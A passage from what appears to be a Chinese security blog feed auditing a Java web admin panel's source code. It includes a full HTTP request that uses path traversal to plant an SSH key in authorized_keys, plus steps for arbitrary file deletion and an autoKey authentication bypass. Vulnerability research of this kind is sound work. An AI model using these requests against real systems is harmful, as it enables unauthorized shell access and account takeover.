class="hljs-meta">@Mapping(&quot;autoLogin&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">autoLogin</span><span class="hljs-params">(String autoKey)</span> &#123;<br><br>   <span class="hljs-comment">// 用户名密码</span><br>   <span class="hljs-type">Admin</span> <span class="hljs-variable">admin</span> <span class="hljs-operator">=</span> adminService.getByAutoKey(autoKey);<br>   <span class="hljs-keyword">if</span> (admin != <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-comment">// 登录成功</span><br>      Context.current().sessionSet(<span class="hljs-string">&quot;localType&quot;</span>, <span class="hljs-string">&quot;local&quot;</span>);<br>      Context.current().sessionSet(<span class="hljs-string">&quot;isLogin&quot;</span>, <span class="hljs-literal">true</span>);<br>      Context.current().sessionSet(<span class="hljs-string">&quot;admin&quot;</span>, admin);<br>      Context.current().sessionRemove(<span class="hljs-string">&quot;imgCode&quot;</span>); <span class="hljs-comment">// 立刻销毁验证码</span><br><br>      <span class="hljs-comment">// 检查更新</span><br>      versionConfig.checkVersion();<br><br>      <span class="hljs-keyword">return</span> renderSuccess(admin);<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> renderError();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这个功能点可以直接登录，什么二次验证都不用管。</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#getByAutoKey</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Admin <span class="hljs-title function_">getByAutoKey</span><span class="hljs-params">(String autoKey)</span> &#123;<br><span class="hljs-keyword">return</span> sqlHelper.findOneByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(Admin::getAutoKey, autoKey), Admin.class);<br>&#125;<br></code></pre></td></tr></table></figure><p>就是从数据库取autokey。</p><p>所以以上changePassOver，addOver两个路由，在发送数据包的时候只要autoKey，直接就可以注入到数据库，然后通过autoLogin接口传入autoKey即可通过认证，绕过密码、google认证。</p><h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231123151820408.png" alt="image-20231123151820408"></p><p><img src="image-20231123151842991.png" alt="image-20231123151842991"></p><p>提交数据包后，成功注入到数据库</p><p><img src="image-20231123151947661.png" alt="image-20231123151947661"></p><p>然后调用autoLogin接口，即可获取认证。</p><p>修改密码接口</p><p><img src="image-20231123152251366.png" alt="image-20231123152251366"></p><p><img src="image-20231123152310239.png" alt="image-20231123152310239"></p><p>成功注入到数据库</p><p><img src="image-20231123152408162.png" alt="image-20231123152408162"></p><p>然后调用autoLogin接口，即可获取admin认证。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>没办法，鉴权做的太好了，只能通过社工来进入后台，后台有命令执行功能点，没什么好审计rce的点，水几个垃圾洞好了。</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastcms代码审计</title>
    <link href="/2023/12/14/fastcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2023/12/14/fastcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-文件上传"><a href="#0x01-文件上传" class="headerlink" title="0x01 文件上传 (&lt;&#x3D;3.7.8)"></a>0x01 文件上传 (&lt;&#x3D;3.7.8)</h2><p>接口&#x2F;adminPage&#x2F;main&#x2F;upload</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;MainController.java#upload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;/adminPage/main/upload&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">upload</span><span class="hljs-params">(Context context, UploadedFile file)</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">File</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(FileUtil.getTmpDir() + <span class="hljs-string">&quot;/&quot;</span> + file.getName());<br>file.transferTo(temp);<br><br><span class="hljs-keyword">return</span> renderSuccess(temp.getPath().replace(<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>));<br>&#125; <span class="hljs-keyword">catch</span> (IllegalStateException | IOException e) &#123;<br>logger.error(e.getMessage(), e);<br>&#125;<br><br><span class="hljs-keyword">return</span> renderError();<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到file.getName()没有过滤，导致可以..&#x2F;..&#x2F;目录穿越到ssh目录，也没有对后缀名限制，可以进行写公钥获取shell。然后把路径“\\”替换“&#x2F;”。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>ssh-keygen -t rsa -f id_rsa</p><p>然后上传</p><p><img src="image-20231122173930609.png" alt="image-20231122173930609"></p><p>可以看到成功上传</p><p><img src="image-20231122174241618.png" alt="image-20231122174241618"></p><p>可以看到成功登陆。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/adminPage/main/upload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>805<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;104&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryZfrhKJObI9gpzcfk<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;macOS&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:8080<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:8080/adminPage/www<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_f8cddee34ca21f05373a9388cfdd798b=1677576503; _jpanonym=&quot;ZWMwM2YzYmEyY2ZiZDFhODVkODkwYmNkMGUxNzU2ZGUjMTY4MzE3NDg1Mzg5NyMzMTUzNjAwMCNZVEZoWWpFNU5XSmpaakE1TkRJek5UaGxNelF4WWprME5qa3lNekZqWkdJPQ==&quot;; Hm_lvt_bfe2407e37bbaa8dc195c5db42daf96a=1683170841,1683202635; SOLONID=5ef99bb26ca845b5b3e528f215e802b4; Hm_lvt_8acef669ea66f479854ecd328d1f348f=1700642329; Hm_lpvt_8acef669ea66f479854ecd328d1f348f=1700643843<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryZfrhKJObI9gpzcfk</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;../../../../../../../Users/username/.ssh/authorized_keys&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/php</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"></span><br><span class="language-pgsql">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDiI95LRyBLW2By5/KuuMm8QBicakTVsGcQGTjkhHTkn5wCkmC9j4Bt1IrM3AGuGZALe/FJMG3EFsnps2usFNgNaoC0qMJ7agjAbLt4BTC4sqlhKjzGEjTU3qvT1jqa/icjF5dOjA/<span class="hljs-number">0</span>B2o3h/<span class="hljs-number">0</span>M1kT6vcihSHELEcVYi13d8wUPqugd+<span class="hljs-number">5</span>uvZpy0giXQNdimZ6GnstBKL+GT9Pptf6ruLZVQvXvhDPMaeLD7/eU49MxVJG0LBBcXcppLYjrUPLVeqiq7kulIkfhHWQZpk4kUqjAtpLqNNhBupQaCekhaq9dJzPFRR6rV9SSAuytz2XEYqGrxm1ywIMd0rX6CsslQGCrPSyFk3zrY5knkOq908hyO6l2B+YPLf0CkmTbFv/RvQgIBDXUP5uWd8vfzjevXicIKNnHOIQR2PKM0bzPKKCkcH0sxpcuAHU+hL1qoX6J/<span class="hljs-number">2</span>HusfZWzifCYkna0iJewQLYT06MUYy1L7AD94SEVxCeZi1fFq/K3dnlvSp5uXv2jbdc= snake@snakedeMac-mini.loca</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryZfrhKJObI9gpzcfk--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure><h2 id="0x02-任意文件删除"><a href="#0x02-任意文件删除" class="headerlink" title="0x02 任意文件删除 (&lt;&#x3D;3.7.8)"></a>0x02 任意文件删除 (&lt;&#x3D;3.7.8)</h2><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;ExportController.java#dataImport()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(value = &quot;dataImport&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dataImport</span><span class="hljs-params">(UploadedFile file, Context context)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>   <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-type">File</span> <span class="hljs-variable">tempFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(homeConfig.home + <span class="hljs-string">&quot;temp&quot;</span> + File.separator + file.getName());<br>      FileUtil.mkdir(tempFile.getParentFile());<br>      file.transferTo(tempFile);<br>      <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> FileUtil.readString(tempFile, StandardCharsets.UTF_8);<br>      tempFile.delete();<br><br>      <span class="hljs-type">AsycPack</span> <span class="hljs-variable">asycPack</span> <span class="hljs-operator">=</span> JSONUtil.toBean(json, AsycPack.class);<br>      confService.setAsycPack(asycPack);<br>      <br>      <span class="hljs-comment">// 导入证书</span><br>      <span class="hljs-keyword">if</span> (asycPack.getCertList() != <span class="hljs-literal">null</span>) &#123;<br>         sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>(), Cert.class);<br>         sqlHelper.insertAll(asycPack.getCertList());<br>      &#125;<br>      <span class="hljs-keyword">if</span> (asycPack.getCertCodeList() != <span class="hljs-literal">null</span>) &#123;<br>         sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>(), CertCode.class);<br>         sqlHelper.insertAll(asycPack.getCertCodeList());<br>      &#125;<br>      <br>      certService.writeAcmeZipBase64(asycPack.getAcmeZip());<br>   &#125;<br>   context.redirect(<span class="hljs-string">&quot;/adminPage/export?over=true&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到file.getName()没有过滤，导致可以..&#x2F;..&#x2F;目录穿越，也没有对后缀名限制，它先上传文件，然后从里面读，紧接着删除文件，只要控制传入文件名导致任意文件删除。</p><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231123002900589.png" alt="image-20231123002900589"></p><p>创建hookdd</p><p>构造数据包</p><p><img src="image-20231123002959116.png" alt="image-20231123002959116"></p><p><img src="image-20231123003017749.png" alt="image-20231123003017749"></p><p>完成删除</p><h2 id="0x03-Admin-注入绕过认证-全版本"><a href="#0x03-Admin-注入绕过认证-全版本" class="headerlink" title="0x03 Admin 注入绕过认证 (全版本)"></a>0x03 Admin 注入绕过认证 (全版本)</h2><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;AdminController.java#changePassOver()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;changePassOver&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">changePassOver</span><span class="hljs-params">(Admin admin)</span> &#123;<br><br>adminService.changePassOver(admin);<br><br><span class="hljs-keyword">return</span> renderSuccess();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changePassOver</span><span class="hljs-params">(Admin admin)</span> &#123;<br><span class="hljs-keyword">if</span> (admin.getAuth()) &#123;<br><span class="hljs-type">Admin</span> <span class="hljs-variable">adminOrg</span> <span class="hljs-operator">=</span> sqlHelper.findById(admin.getId(), Admin.class);<br><span class="hljs-keyword">if</span> (StrUtil.isEmpty(adminOrg.getKey())) &#123;<br>admin.setKey(authUtils.makeKey());<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>admin.setKey(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (StrUtil.isNotEmpty(admin.getPass())) &#123;<br>admin.setPass(EncodePassUtils.encode(admin.getPass()));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>admin.setPass(<span class="hljs-literal">null</span>);<br>&#125;<br>sqlHelper.updateById(admin);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里也是对admin.getId()判断，然后来改密码。</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;AdminController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;addOver&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">addOver</span><span class="hljs-params">(Admin admin, String[] parentId)</span> &#123;<br><span class="hljs-keyword">if</span> (StrUtil.isEmpty(admin.getId())) &#123;<br><span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> adminService.getCountByName(admin.getName());<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> renderError(m.get(<span class="hljs-string">&quot;adminStr.nameRepetition&quot;</span>));<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> adminService.getCountByNameWithOutId(admin.getName(), admin.getId());<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> renderError(m.get(<span class="hljs-string">&quot;adminStr.nameRepetition&quot;</span>));<br>&#125;<br>&#125;<br><br>adminService.addOver(admin, parentId);<br><br><span class="hljs-keyword">return</span> renderSuccess();<br>&#125;<br></code></pre></td></tr></table></figure><p>添加用户的路由, 可以控制admin，parentId，admin.getId()是否为空，不为空进入adminService.getCountByName，跟进getCountByName()</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#getCountByName</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getCountByName</span><span class="hljs-params">(String name)</span> &#123;<br><span class="hljs-keyword">return</span> sqlHelper.findCountByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(Admin::getName, name), Admin.class);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到进行sql查询，查看数据库是否存在用户。不存在此用户就在service层面创建用户，跟进adminService.addOver。</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#addOver()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addOver</span><span class="hljs-params">(Admin admin, String[] groupIds)</span> &#123;<br>sqlHelper.insertOrUpdate(admin);<br><br>sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(AdminGroup::getAdminId, admin.getId()), AdminGroup.class);<br><span class="hljs-keyword">if</span> (admin.getType() == <span class="hljs-number">1</span> &amp;&amp; groupIds != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">for</span> (String id : groupIds) &#123;<br><span class="hljs-type">AdminGroup</span> <span class="hljs-variable">adminGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdminGroup</span>();<br>adminGroup.setAdminId(admin.getId());<br>adminGroup.setGroupId(id);<br>sqlHelper.insert(adminGroup);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法直接将admin添加到数据库，deleteByQuery就是根据admin_id删除admin_group的数据，不重要，dmin.getType() &#x3D;&#x3D; 1就是非管理员，管理员的type为0，不会走到这里。</p><p>以上两个路由都接收的Admin admin，</p><p>com&#x2F;cym&#x2F;model&#x2F;Admin.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseModel</span> &#123;<br>String name;<br>String pass;<br><span class="hljs-comment">// 谷歌秘钥</span><br>String key;<br><span class="hljs-comment">// 是否开启谷歌验证</span><br><span class="hljs-meta">@InitValue(&quot;false&quot;)</span><br>Boolean auth;<br><br><span class="hljs-comment">// 是否开启api</span><br><span class="hljs-meta">@InitValue(&quot;false&quot;)</span><br>Boolean api;<br><br>String token;<br><span class="hljs-comment">// 自动登录key</span><br>String autoKey;<br><br><span class="hljs-comment">// 类型 0 超管 1 受限用户</span><br><span class="hljs-meta">@InitValue(&quot;0&quot;)</span><br>Integer type;<br></code></pre></td></tr></table></figure><p>admin类型里面包含了自动登录key，autoKey。</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;LoginController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;autoLogin&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">autoLogin</span><span class="hljs-params">(String autoKey)</span> &#123;<br><br>   <span class="hljs-comment">// 用户名密码</span><br>   <span class="hljs-type">Admin</span> <span class="hljs-variable">admin</span> <span class="hljs-operator">=</span> adminService.getByAutoKey(autoKey);<br>   <span class="hljs-keyword">if</span> (admin != <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-comment">// 登录成功</span><br>      Context.current().sessionSet(<span class="hljs-string">&quot;localType&quot;</span>, <span class="hljs-string">&quot;local&quot;</span>);<br>      Context.current().sessionSet(<span class="hljs-string">&quot;isLogin&quot;</span>, <span class="hljs-literal">true</span>);<br>      Context.current().sessionSet(<span class="hljs-string">&quot;admin&quot;</span>, admin);<br>      Context.current().sessionRemove(<span class="hljs-string">&quot;imgCode&quot;</span>); <span class="hljs-comment">// 立刻销毁验证码</span><br><br>      <span class="hljs-comment">// 检查更新</span><br>      versionConfig.checkVersion();<br><br>      <span class="hljs-keyword">return</span> renderSuccess(admin);<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> renderError();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这个功能点可以直接登录，什么二次验证都不用管。</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#getByAutoKey</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Admin <span class="hljs-title function_">getByAutoKey</span><span class="hljs-params">(String autoKey)</span> &#123;<br><span class="hljs-keyword">return</span> sqlHelper.findOneByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(Admin::getAutoKey, autoKey), Admin.class);<br>&#125;<br></code></pre></td></tr></table></figure><p>就是从数据库取autokey。</p><p>所以以上changePassOver，addOver两个路由，在发送数据包的时候只要autoKey，直接就可以注入到数据库，然后通过autoLogin接口传入autoKey即可通过认证，绕过密码、google认证。</p><h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231123151820408.png" alt="image-20231123151820408"></p><p><img src="image-20231123151842991.png" alt="image-20231123151842991"></p><p>提交数据包后，成功注入到数据库</p><p><img src="image-20231123151947661.png" alt="image-20231123151947661"></p><p>然后调用autoLogin接口，即可获取认证。</p><p>修改密码接口</p><p><img src="image-20231123152251366.png" alt="image-20231123152251366"></p><p><img src="image-20231123152310239.png" alt="image-20231123152310239"></p><p>成功注入到数据库</p><p><img src="image-20231123152408162.png" alt="image-20231123152408162"></p><p>然后调用autoLogin接口，即可获取admin认证。</p><h2 id="0x04-csrf创建管理员-全版本"><a href="#0x04-csrf创建管理员-全版本" class="headerlink" title="0x04 csrf创建管理员 (全版本)"></a>0x04 csrf创建管理员 (全版本)</h2><p>com&#x2F;cym&#x2F;model&#x2F;Admin.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseModel</span> &#123;<br>String name;<br>String pass;<br><span class="hljs-comment">// 谷歌秘钥</span><br>String key;<br><span class="hljs-comment">// 是否开启谷歌验证</span><br><span class="hljs-meta">@InitValue(&quot;false&quot;)</span><br>Boolean auth;<br><br><span class="hljs-comment">// 是否开启api</span><br><span class="hljs-meta">@InitValue(&quot;false&quot;)</span><br>Boolean api;<br><br>String token;<br><span class="hljs-comment">// 自动登录key</span><br>String autoKey;<br><br><span class="hljs-comment">// 类型 0 超管 1 受限用户</span><br><span class="hljs-meta">@InitValue(&quot;0&quot;)</span><br>Integer type;<br></code></pre></td></tr></table></figure><p>admin类型里面包含的字段。</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;AdminController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;addOver&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">addOver</span><span class="hljs-params">(Admin admin, String[] parentId)</span> &#123;<br><span class="hljs-keyword">if</span> (StrUtil.isEmpty(admin.getId())) &#123;<br><span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> adminService.getCountByName(admin.getName());<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> renderError(m.get(<span class="hljs-string">&quot;adminStr.nameRepetition&quot;</span>));<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> adminService.getCountByNameWithOutId(admin.getName(), admin.getId());<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> renderError(m.get(<span class="hljs-string">&quot;adminStr.nameRepetition&quot;</span>));<br>&#125;<br>&#125;<br><br>adminService.addOver(admin, parentId);<br><br><span class="hljs-keyword">return</span> renderSuccess();<br>&#125;<br></code></pre></td></tr></table></figure><p>添加用户的路由, 可以控制admin，parentId，admin.getId()是否为空，不为空进入adminService.getCountByName，跟进getCountByName()</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#getCountByName</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Long <span 